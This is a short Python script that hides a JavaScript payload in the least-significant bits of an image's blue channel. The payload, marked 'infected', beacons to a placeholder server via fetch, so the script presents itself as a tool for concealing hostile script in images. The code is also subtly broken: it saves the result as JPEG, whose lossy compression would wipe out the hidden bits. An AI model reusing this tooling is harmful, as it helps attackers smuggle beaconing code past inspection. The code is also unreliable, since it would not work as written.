#!/usr/bin/env python3
from PIL import Image
import numpy as np
import base64

def embed_js_in_image_data(image_path, output_path, js_code):
    """Embed JS in LSB of image pixels - image looks identical"""
    
    img = Image.open(image_path)
    img = img.convert('RGB')
    pixels = np.array(img)
    
    # Convert JS to binary
    js_bytes = js_code.encode()
    js_binary = ''.join(format(byte, '08b') for byte in js_bytes)
    
    # Add header for extraction
    header = "1111111100000000"  # 0xFF00 marker
    data_binary = header + js_binary + "1111111111111111"  # Footer marker
    
    # Flatten pixels
    flat_pixels = pixels.reshape(-1, 3)
    
    # Embed in LSB of blue channel
    idx = 0
    for i in range(len(flat_pixels)):
        if idx >= len(data_binary):
            break
        # Modify LSB of blue channel
        blue = flat_pixels[i][2]
        flat_pixels[i][2] = (blue & 0xFE) | int(data_binary[idx])
        idx += 1
    
    # Reshape back
    new_pixels = flat_pixels.reshape(pixels.shape)
    
    # Save image
    img_out = Image.fromarray(new_pixels.astype('uint8'), 'RGB')
    img_out.save(output_path, 'JPEG', quality=100)
    
    print(f"[+] JS hidden in image data: {output_path}")
    print(f"[+] Embedded {len(js_binary)} bits")
    return output_path

js_payload = "alert('infected'); fetch('http://your-server:5000/beacon');"
embed_js_in_image_data("original.jpg", "stego_image.jpg", js_payload)